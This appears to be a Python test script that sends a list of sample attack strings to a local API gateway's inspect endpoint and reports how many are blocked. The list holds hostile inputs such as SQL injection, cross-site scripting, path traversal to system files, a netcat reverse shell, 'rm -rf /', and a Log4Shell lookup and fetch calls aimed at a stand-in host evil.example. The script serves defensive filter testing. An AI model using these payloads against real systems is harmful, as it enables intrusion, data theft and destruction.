#!/usr/bin/env python3
"""Send sample attack payloads to the API Gateway inspect endpoint and print a summary.

Defaults to http://localhost:9000/inspect based on repo conventions. Prints per-payload response and a short summary.
"""
import requests
import sys
import time

GATEWAY_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9000/inspect"

SAMPLE_PAYLOADS = [
    {"payload": "' OR '1'='1"},
    {"payload": "<script>alert(1)</script>"},
    {"payload": "../../etc/passwd"},
    {"payload": "<img src=x onerror=alert(1)>"},
    {"payload": "admin'--"},
    {"payload": "<svg/onload=alert(1)>"},
    {"payload": "| nc -e /bin/sh 10.0.0.1 4444"},
    {"payload": "<iframe src=javascript:alert(1)></iframe>"},
    {"payload": "`rm -rf /`"},
    {"payload": "../..\\..\\windows\\system32\\cmd.exe"},
    {"payload": "UNION SELECT username, password FROM users"},
    {"payload": "<script>fetch('http://evil.example')</script>"},
    {"payload": "<% system('id') %>"},
    {"payload": "<form action=//evil.example>"},
    {"payload": "<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",},
    {"payload": "${jndi:ldap://evil.example/a}"},
    {"payload": "SELECT * FROM users WHERE name = 'a' --"},
    {"payload": "<input value=\"\' OR 1=1 --\">"},
    {"payload": "../../../../boot.ini"},
    {"payload": "<script>document.cookie</script>"},
]


def main():
    print(f"Testing {len(SAMPLE_PAYLOADS)} payloads against {GATEWAY_URL}")
    blocked = 0
    results = []
    for i, entry in enumerate(SAMPLE_PAYLOADS, start=1):
        payload = entry
        try:
            resp = requests.post(GATEWAY_URL, json=payload, timeout=10)
            status = resp.status_code
            try:
                body = resp.json()
            except Exception:
                body = resp.text
            is_blocked = False
            if isinstance(body, dict):
                # conventions in repo: responses include 'blocked' or 'action' keys
                is_blocked = body.get('blocked') or body.get('action') == 'block' or body.get('status') == 'blocked'

            if is_blocked:
                blocked += 1

            print(f"{i:02d}. payload={repr(payload['payload'])[:60]:60} -> status={status} blocked={is_blocked}")
            results.append({'payload': payload, 'status': status, 'blocked': bool(is_blocked), 'body': body})
        except Exception as e:
            print(f"{i:02d}. payload={repr(payload['payload'])[:60]:60} -> ERROR: {e}")
            results.append({'payload': payload, 'status': None, 'error': str(e)})
        time.sleep(0.2)

    print("\nSummary:")
    print(f"Total tested: {len(SAMPLE_PAYLOADS)}")
    print(f"Blocked by gateway: {blocked}")


if __name__ == '__main__':
    main()
